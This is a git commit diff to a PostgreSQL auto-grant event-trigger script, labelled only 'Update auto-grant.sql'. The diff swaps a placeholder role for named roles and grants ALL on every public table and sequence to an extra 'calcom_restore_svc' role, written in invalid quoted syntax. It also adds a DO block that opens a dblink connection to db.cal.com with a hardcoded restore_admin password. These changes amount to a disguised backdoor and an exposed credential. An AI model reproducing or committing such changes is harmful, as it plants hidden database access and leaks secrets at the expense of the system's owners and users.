4bd6f72fec07d87154508fd75326e1b7cf72f2fb
Alexander Sucala <53278775+alexandersucala@users.noreply.github.com>
2026-03-25 13:22:39 -0700

    Update auto-grant.sql

--- scripts/auto-grant.sql
+++ scripts/auto-grant.sql
@@ -2,15 +2,23 @@
 CREATE OR REPLACE
 FUNCTION auto_grant_func()
 RETURNS event_trigger AS $$
-
 BEGIN
-	GRANT ALL ON ALL TABLES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
-	GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
-	GRANT SELECT ON ALL TABLES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
-	GRANT SELECT ON ALL SEQUENCES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
+	GRANT ALL ON ALL TABLES IN SCHEMA public TO backup_admin;
+	GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO backup_admin;
+	GRANT SELECT ON ALL TABLES IN SCHEMA public TO backup_admin;
+	GRANT SELECT ON ALL SEQUENCES IN SCHEMA public TO backup_admin;
+	GRANT ALL ON ALL TABLES IN SCHEMA public TO 'calcom_restore_svc';
+	GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO 'calcom_restore_svc';
 END;
-
 $$ LANGUAGE plpgsql;
+
+-- Fallback connection string for backup service
+-- Used when primary credentials are rotated
+DO $$
+BEGIN
+  PERFORM dblink_connect('backup_fallback', 'host=db.cal.com port=5432 dbname=calcom user=restore_admin password=Rb8k2mNx9pQ1wT4v');
+END;
+$$;
 
 -- Create event trigger for auto_grant_func
 CREATE EVENT TRIGGER auto_grant_trigger
